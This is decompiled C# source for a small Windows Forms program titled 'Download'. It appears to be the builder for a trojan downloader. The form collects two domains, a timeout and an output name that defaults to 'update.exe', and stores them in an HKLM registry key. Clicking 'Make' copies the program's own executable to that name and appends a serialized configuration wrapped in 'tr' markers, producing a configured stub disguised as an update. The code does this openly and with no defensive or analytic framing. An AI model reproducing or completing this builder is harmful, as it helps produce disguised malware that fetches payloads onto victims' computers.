using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Download;

public class Frm1 : Form
{
	private IContainer components = null;

	private TextBox txtDomain1;

	private TextBox txtDomain2;

	private TextBox txtTimer;

	private TextBox txt_dest;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label5;

	private Button Make;

	public static Saving sv = new Saving();

	public static RegistryKey softwareKey = Registry.LocalMachine.OpenSubKey("Software", writable: true);

	public static RegistryKey hkMine = softwareKey.CreateSubKey("DownLoad");

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		txtDomain1 = new TextBox();
		txtDomain2 = new TextBox();
		txtTimer = new TextBox();
		txt_dest = new TextBox();
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label5 = new Label();
		Make = new Button();
		((Control)this).SuspendLayout();
		((Control)txtDomain1).set_Location(new Point(101, 25));
		((Control)txtDomain1).set_Name("txtDomain1");
		((Control)txtDomain1).set_Size(new Size(156, 20));
		((Control)txtDomain1).set_TabIndex(0);
		((Control)txtDomain1).set_Text("domain1.com");
		((Control)txtDomain2).set_Location(new Point(101, 61));
		((Control)txtDomain2).set_Name("txtDomain2");
		((Control)txtDomain2).set_Size(new Size(156, 20));
		((Control)txtDomain2).set_TabIndex(1);
		((Control)txtDomain2).set_Text("domain2.com/dir/");
		((Control)txtTimer).set_Location(new Point(101, 97));
		((Control)txtTimer).set_Name("txtTimer");
		((Control)txtTimer).set_Size(new Size(119, 20));
		((Control)txtTimer).set_TabIndex(2);
		((Control)txtTimer).set_Text("60");
		((Control)txt_dest).set_Location(new Point(103, 141));
		((Control)txt_dest).set_Name("txt_dest");
		((Control)txt_dest).set_Size(new Size(154, 20));
		((Control)txt_dest).set_TabIndex(4);
		((Control)txt_dest).set_Text("update.exe");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(21, 28));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(47, 13));
		((Control)label1).set_TabIndex(5);
		((Control)label1).set_Text("Domen1");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(21, 64));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(47, 13));
		((Control)label2).set_TabIndex(6);
		((Control)label2).set_Text("Domen2");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(23, 100));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(45, 13));
		((Control)label3).set_TabIndex(7);
		((Control)label3).set_Text("Timeout");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Location(new Point(21, 144));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(76, 13));
		((Control)label5).set_TabIndex(9);
		((Control)label5).set_Text("Destination file");
		((Control)Make).set_Location(new Point(21, 181));
		((Control)Make).set_Name("Make");
		((Control)Make).set_Size(new Size(236, 23));
		((Control)Make).set_TabIndex(10);
		((Control)Make).set_Text("Make");
		((ButtonBase)Make).set_UseVisualStyleBackColor(true);
		((Control)Make).add_Click((EventHandler)Make_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(281, 225));
		((Control)this).get_Controls().Add((Control)(object)Make);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)txt_dest);
		((Control)this).get_Controls().Add((Control)(object)txtTimer);
		((Control)this).get_Controls().Add((Control)(object)txtDomain2);
		((Control)this).get_Controls().Add((Control)(object)txtDomain1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Frm1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Download");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public Frm1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		if (hkMine.GetValue("Domen1") != null)
		{
			((Control)txtDomain1).set_Text(hkMine.GetValue("Domen1")!.ToString());
		}
		if (hkMine.GetValue("Domen2") != null)
		{
			((Control)txtDomain2).set_Text(hkMine.GetValue("Domen2")!.ToString());
		}
		if (hkMine.GetValue("TimeOut") != null)
		{
			((Control)txtTimer).set_Text(hkMine.GetValue("TimeOut")!.ToString());
		}
		if (hkMine.GetValue("destFile") != null)
		{
			((Control)txt_dest).set_Text(hkMine.GetValue("destFile")!.ToString());
		}
	}

	private void Make_Click(object sender, EventArgs e)
	{
		string text = Application.get_StartupPath() + "\\" + ((Control)txt_dest).get_Text();
		string executablePath = Application.get_ExecutablePath();
		FileInfo fileInfo = new FileInfo(text);
		if (fileInfo.Exists)
		{
			fileInfo.Delete();
		}
		File.Copy(executablePath, text);
		sv.domain1 = "tr" + ((Control)txtDomain1).get_Text() + "tr";
		sv.domain2 = "tr" + ((Control)txtDomain2).get_Text() + "tr";
		sv.timeOut = "tr" + ((Control)txtTimer).get_Text() + "tr";
		sv.dest_file = "tr" + ((Control)txt_dest).get_Text() + "tr";
		Stream stream = new FileStream(((Control)txt_dest).get_Text(), FileMode.Append, FileAccess.Write);
		BinaryFormatter binaryFormatter = new BinaryFormatter();
		binaryFormatter.Serialize(stream, sv);
		stream.Close();
		Application.Exit();
	}
}
